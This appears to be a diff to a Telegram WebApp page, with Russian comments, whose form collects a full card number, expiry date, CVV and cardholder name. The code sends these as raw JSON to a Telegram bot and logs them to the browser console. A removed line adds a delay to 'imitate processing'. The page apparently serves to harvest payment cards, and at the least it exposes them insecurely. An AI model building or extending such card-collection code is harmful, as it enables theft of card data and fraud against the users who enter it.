@@ -247,12 +247,24 @@
     <script>
         // Инициализация Telegram WebApp
         const tg = window.Telegram.WebApp;
+        
+        // Расширяем на весь экран
         tg.expand();
+        
+        // Сообщаем что WebApp готов
         tg.ready();
         
-        // Настройка цвета заголовка
+        // Настройка цвета
         tg.setHeaderColor('#667eea');
         tg.setBackgroundColor('#ffffff');
+        
+        // Включаем кнопку "Назад"
+        if (tg.BackButton) {
+            tg.BackButton.show();
+            tg.onEvent('backButtonClicked', function() {
+                tg.close();
+            });
+        }
         
         // Форматирование номера карты
         const cardNumberInput = document.getElementById('cardNumber');
@@ -278,7 +290,7 @@
             e.target.value = value;
         });
         
-        // Разрешаем только цифры для CVV
+        // Только цифры для CVV
         const cardCvvInput = document.getElementById('cardCvv');
         cardCvvInput.addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/\D/g, '');
@@ -318,31 +330,30 @@
             document.getElementById('cardForm').style.display = 'none';
             document.getElementById('loading').classList.add('active');
             
-            // Формируем данные для отправки
+            // Формируем данные
             const data = {
                 card_number: cardNumber,
                 card_expiry: cardExpiry,
                 card_cvv: cardCvv,
-                card_holder: cardHolder,
-                timestamp: new Date().toISOString()
+                card_holder: cardHolder
             };
             
             // Отправляем данные в бот
-            setTimeout(() => {
+            console.log('Sending data to bot:', data);
+            
+            try {
                 tg.sendData(JSON.stringify(data));
-                tg.close();
-            }, 1500); // Небольшая задержка для имитации обработки
+                console.log('Data sent successfully');
+                
+                // Закрываем WebApp через небольшую задержку
+                setTimeout(() => {
+                    tg.close();
+                }, 500);
+            } catch (err) {
+                console.error('Error sending data:', err);
+                tg.showAlert('Ошибка отправки данных. Попробуйте снова.');
+            }
         });
-        
-        // Обработка кнопки "Назад" в Telegram
-        tg.onEvent('backButtonClicked', function() {
-            tg.close();
-        });
-        
-        // Включаем кнопку "Назад" если доступно
-        if (tg.BackButton) {
-            tg.BackButton.show();
-        }
     </script>
 </body>
 </html>
